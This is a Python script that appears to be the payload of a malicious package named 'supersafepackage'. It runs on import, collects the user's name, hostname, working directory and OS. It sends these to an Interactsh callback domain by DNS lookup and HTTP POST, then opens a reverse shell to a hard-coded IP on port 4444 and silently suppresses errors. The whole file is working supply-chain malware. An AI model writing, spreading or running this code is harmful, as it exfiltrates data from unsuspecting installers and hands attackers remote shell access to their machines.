import os
import socket
import getpass
import base64
import json
import http.client
import subprocess

# ========== Config ==========
INTERACTSH_DOMAIN = "dbwgovzrtoclyqrugbqevdt4m4kxd4k1u.oast.fun"  # Replace with your Interactsh subdomain
PACKAGE_NAME = "supersafepackage"
PACKAGE_VERSION = "6.0.0"

# ========== Helpers ==========
def b64safe(data):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")

# ========== Reverse Shell ==========
def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("60.254.0.128", 4444))  # Replace with your public IP
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh"])
    except:
        pass

# ========== Payload Execution ==========
try:
    user = getpass.getuser()
    hostname = socket.gethostname()
    cwd = os.getcwd()
    uname = os.popen("uname").read().strip()

    # DNS pingback
    encoded_host = b64safe(hostname)
    encoded_user = b64safe(user)
    os.system(f"nslookup {encoded_user}.{encoded_host}.{INTERACTSH_DOMAIN}")

    # Optional HTTP callback
    payload = {
        "cwd": cwd,
        "package": PACKAGE_NAME,
        "version": PACKAGE_VERSION,
        "hostname": hostname,
        "uname": uname,
        "whoami": user
    }

    body = json.dumps(payload).encode()
    conn = http.client.HTTPConnection(INTERACTSH_DOMAIN, 80)
    conn.request("POST", "/", body, headers={
        "Content-Type": "application/json"
    })
    conn.close()

    # Trigger reverse shell
    reverse_shell()

except Exception as e:
    pass  # Avoid breaking the host app
